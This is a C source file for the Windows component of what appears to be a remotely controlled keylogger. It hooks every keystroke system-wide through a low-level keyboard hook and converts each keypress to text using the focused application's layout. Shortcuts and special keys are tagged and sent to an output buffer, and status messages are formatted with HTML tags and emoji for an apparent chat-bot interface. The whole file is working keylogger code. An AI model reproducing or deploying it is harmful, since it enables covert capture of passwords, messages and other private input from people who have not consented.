/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static HANDLE listener_thread;
static DWORD listener_thread_id;
static int listener_started;
static volatile int stopping;
static HHOOK keyboard_hook;

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = kbd->vkCode;

        /* Ignore standalone modifier keydown events so they don't produce empty labels */
        if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
            vk == VK_LMENU || vk == VK_RMENU || vk == VK_MENU ||
            vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT ||
            vk == VK_LWIN || vk == VK_RWIN) {
            return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
        }

        int ctrl_down = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        int shift_down = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        int alt_down = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
        int win_down = (GetAsyncKeyState(VK_LWIN) & 0x8000) != 0 ||
                       (GetAsyncKeyState(VK_RWIN) & 0x8000) != 0;

        char key_label[64] = {0};
        int is_special = 0;
        int is_printable = 0;

        if (vk >= VK_F1 && vk <= VK_F24) {
            snprintf(key_label, sizeof(key_label), "F%lu", (unsigned long)(vk - VK_F1 + 1));
            is_special = 1;
        } else {
            switch (vk) {
            case VK_RETURN:
                key_label[0] = '\n';
                key_label[1] = '\0';
                is_printable = 1;
                break;
            case VK_SPACE:
                key_label[0] = ' ';
                key_label[1] = '\0';
                is_printable = 1;
                break;
            case VK_TAB:
                key_label[0] = '\t';
                key_label[1] = '\0';
                is_printable = 1;
                break;
            case VK_BACK:
                keyboard_output_backspace();
                break;
            case VK_ESCAPE:
                snprintf(key_label, sizeof(key_label), "ESC");
                is_special = 1;
                break;
            case VK_DELETE:
                snprintf(key_label, sizeof(key_label), "Del");
                is_special = 1;
                break;
            case VK_INSERT:
                snprintf(key_label, sizeof(key_label), "Ins");
                is_special = 1;
                break;
            case VK_HOME:
                snprintf(key_label, sizeof(key_label), "Home");
                is_special = 1;
                break;
            case VK_END:
                snprintf(key_label, sizeof(key_label), "End");
                is_special = 1;
                break;
            case VK_PRIOR:
                snprintf(key_label, sizeof(key_label), "PgUp");
                is_special = 1;
                break;
            case VK_NEXT:
                snprintf(key_label, sizeof(key_label), "PgDn");
                is_special = 1;
                break;
            case VK_LEFT:
                snprintf(key_label, sizeof(key_label), "Left");
                is_special = 1;
                break;
            case VK_UP:
                snprintf(key_label, sizeof(key_label), "Up");
                is_special = 1;
                break;
            case VK_RIGHT:
                snprintf(key_label, sizeof(key_label), "Right");
                is_special = 1;
                break;
            case VK_DOWN:
                snprintf(key_label, sizeof(key_label), "Down");
                is_special = 1;
                break;
            case VK_SNAPSHOT:
                snprintf(key_label, sizeof(key_label), "PrtScn");
                is_special = 1;
                break;
            case VK_PAUSE:
                snprintf(key_label, sizeof(key_label), "Pause");
                is_special = 1;
                break;
            case VK_SCROLL:
                snprintf(key_label, sizeof(key_label), "ScrollLock");
                is_special = 1;
                break;
            case VK_NUMLOCK:
                snprintf(key_label, sizeof(key_label), "NumLock");
                is_special = 1;
                break;
            default: {
                BYTE key_state[256] = {0};
                if (shift_down) key_state[VK_SHIFT] = 0x80;
                if (ctrl_down) key_state[VK_CONTROL] = 0x80;
                if (alt_down) key_state[VK_MENU] = 0x80;
                if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;

                HWND fg_wnd = GetForegroundWindow();
                DWORD fg_thread = fg_wnd ? GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
                HKL hkl = fg_thread ? GetKeyboardLayout(fg_thread) : GetKeyboardLayout(0);

                WCHAR unicode_buf[8] = {0};
                int count = ToUnicodeEx(vk, kbd->scanCode, key_state, unicode_buf, 4, 0, hkl);
                if (count > 0) {
                    int utf8_bytes = WideCharToMultiByte(CP_UTF8, 0, unicode_buf, count,
                                                         key_label, sizeof(key_label) - 1, nullptr, nullptr);
                    if (utf8_bytes > 0) {
                        key_label[utf8_bytes] = '\0';
                        is_printable = 1;
                    }
                }
                break;
            }
            }
        }

        if (is_special || is_printable) {
            int is_altgr = (ctrl_down && alt_down) || ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0);
            int has_modifier = (ctrl_down && !is_altgr) || (alt_down && !is_altgr) || win_down;
            if (has_modifier && key_label[0] != '\n') {
                if (keyboard_get_shortcuts_enabled()) {
                    char mod_buf[96];
                    int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
                    if (ctrl_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
                    if (alt_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Alt+");
                    if (win_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Win+");
                    if (shift_down && !is_printable) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Shift+");
                    offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "%s]", key_label);
                    if (offset > 0 && (size_t)offset < sizeof(mod_buf)) {
                        keyboard_output_append(mod_buf, (size_t)offset);
                    }
                }
            } else if (is_special) {
                if (keyboard_get_shortcuts_enabled()) {
                    char spec_buf[48];
                    int spec_len = snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
                    if (spec_len > 0) {
                        keyboard_output_append(spec_buf, (size_t)spec_len);
                    }
                }
            } else if (is_printable) {
                keyboard_output_append(key_label, strlen(key_label));
            }
        }
    }

    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

static DWORD WINAPI listener_worker([[maybe_unused]] void *context)
{
    listener_thread_id = GetCurrentThreadId();

    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                      GetModuleHandleW(nullptr), 0);
    if (!keyboard_hook) {
        c2t_log_error("keyboard", "SetWindowsHookExW failed (error %lu)", GetLastError());
        return 1;
    }

    c2t_log_info("keyboard", "Windows low-level keyboard hook active");

    MSG msg;
    while (!stopping && !c2t_runtime_stop_requested()) {
        BOOL res = PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE);
        if (res > 0) {
            if (msg.message == WM_QUIT)
                break;
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        } else {
            MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
        }
    }

    if (keyboard_hook) {
        UnhookWindowsHookEx(keyboard_hook);
        keyboard_hook = nullptr;
    }

    keyboard_output_flush();
    return 0;
}

int keyboard_listen(void)
{
    return (int)listener_worker(nullptr);
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    listener_thread = CreateThread(nullptr, 0, listener_worker, nullptr, 0, &listener_thread_id);
    listener_started = (listener_thread != nullptr);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start Windows keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    if (listener_thread_id != 0) {
        PostThreadMessageW(listener_thread_id, WM_QUIT, 0, 0);
    }
    WaitForSingleObject(listener_thread, INFINITE);
    CloseHandle(listener_thread);
    listener_started = 0;
}

static char windows_selected_target[128] = "all";

int keyboard_get_device_list(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return 0;
    snprintf(buffer, max_len,
             "⌨️ <b>Windows Keyboard Devices:</b>\n\n"
             "• <b>[0]</b> <code>WH_KEYBOARD_LL</code> (Low-Level Windows Hook) — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>", windows_selected_target);
    return 1;
}

int keyboard_select_device(const char *target)
{
    if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
        snprintf(windows_selected_target, sizeof(windows_selected_target), "all");
    } else {
        snprintf(windows_selected_target, sizeof(windows_selected_target), "%s", target);
    }
    return 1;
}

void keyboard_get_selected_target(char *buffer, size_t max_len)
{
    if (buffer && max_len > 0) {
        snprintf(buffer, max_len, "%s", windows_selected_target);
    }
}

int keyboard_get_device_count(void)
{
    return 1;
}

int keyboard_set_layout([[maybe_unused]] const char *layout_name)
{
    /* On Windows, layout is tracked automatically per active window via ToUnicodeEx */
    return 1;
}

void keyboard_get_layout(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return;
    HWND fg_wnd = GetForegroundWindow();
    DWORD fg_thread = fg_wnd ? GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
    HKL hkl = fg_thread ? GetKeyboardLayout(fg_thread) : GetKeyboardLayout(0);
    unsigned short lang_id = (unsigned short)((uintptr_t)hkl & 0xFFFF);
    char lang_name[128] = {0};
    if (GetLocaleInfoA(MAKELCID(lang_id, SORT_DEFAULT), LOCALE_SLANGUAGE, lang_name, sizeof(lang_name)) > 0) {
        snprintf(buffer, max_len, "🪟 Windows Native (%s, 0x%04X)", lang_name, lang_id);
    } else {
        snprintf(buffer, max_len, "🪟 Windows Native (Auto, 0x%04X)", lang_id);
    }
}

void keyboard_get_available_layouts(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return;
    snprintf(buffer, max_len,
             "🌐 <b>Windows Keyboard Layout:</b>\n"
             "• Windows automatically maps keystrokes using the active application's layout in real-time.\n");
}
#endif


